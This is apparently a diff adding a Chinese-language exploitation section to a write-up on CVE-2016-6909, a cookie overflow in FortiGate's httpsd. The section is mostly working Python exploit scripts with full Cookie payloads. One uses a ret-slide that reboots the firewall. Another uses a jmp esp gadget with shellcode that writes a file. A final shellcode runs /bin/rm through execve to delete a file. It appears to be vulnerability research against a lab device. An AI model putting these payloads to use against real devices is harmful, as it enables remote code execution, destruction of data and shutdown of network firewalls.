@@ -210,7 +210,95 @@ libc offset 0x1d218 处代码如下，该段代码位于 libc 中函数 `__libc
 
 
 ## 漏洞利用
+httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：
 
+```shell
+$ checksec ./init
+[*] '/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+    RPATH:    b'../lib:../ulib:/fortidev/lib:/lib'
+```
 
+保护全关，有相当大的操作空间。
 
+### ret2text
+先试一下是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，作者这里选用了一段关机代码
+```
+.text:080601AE                 push    4321FEDCh       ; howto
+.text:080601B3                 call    _reboot
+```
+
+http 请求头的长度毫无疑问能够满足对 payload 的要求，故作者直接使用大量的 `ret` 指令作为 slide code，省去计算溢出长度的必要
+
+```python
+from requests import *
+from pwn import *
+#e = ELF('./init')
+url = 'http://192.168.219.99/index'
+
+headers = {
+    'Content-Type':'application/json',
+    'Content-Length':'12',
+    'Accept':'*/*',
+    'Accept-Encoding':'gzip,deflate,br',
+
+    'User-Agent':'PostmanRuntime/7.28.3', 
+    'Host':'192.168.219.99', 
+    'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + '\x1c\x8d\x04\x08' * 100 + '\xae\x01\x06\x08'
+    }
+
+r = post(url, headers = headers)
+print(r.text)
+print(r.headers)
+```
+
+运行后防火墙成功关机。
+
+### ret2shellcode
+由于没有开启 NX 保护，我们可以考虑通过`jmp esp` 的 gadget 来直接执行 shellcode.
+
+构建shellcode创建文件并写入内容
+```python
+from requests import *
+from pwn import *
+context.arch = 'i386'
+#e = ELF('./init')
+url = 'http://192.168.219.99/index'
+
+cookie = ''
+cookie += 'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash='
+cookie += '\x1c\x8d\x04\x08' * 100 # ret
+cookie += '\xf7\xbd\x96\x08' # add eax, ebp ; jmp esp
+# following are shellcode
+cookie += '\x90' * 0x80 # slide code nop
+cookie += '1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3' # 'xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx'
+headers = {
+    'Content-Type':'application/json',
+    'Content-Length':'12',
+    'Accept':'*/*',
+    'Accept-Encoding':'gzip,deflate,br',
+
+    'User-Agent':'PostmanRuntime/7.28.3', 
+    'Host':'192.168.219.99', 
+    'Cookie':cookie
+    }
+
+r = post(url, headers = headers)
+print(r.text)
+print(r.headers)
+```
+
+![](images/Pasted%20image%2020230517112037.png)
+
+然后通过下列 shellcode 通过系统调用 execve 调用 `/bin/rm` 删除我们的 flag
+```
+cookie += '1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80' # 'xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80'
+```
+
+![](images/Pasted%20image%2020230517112124.png)
 
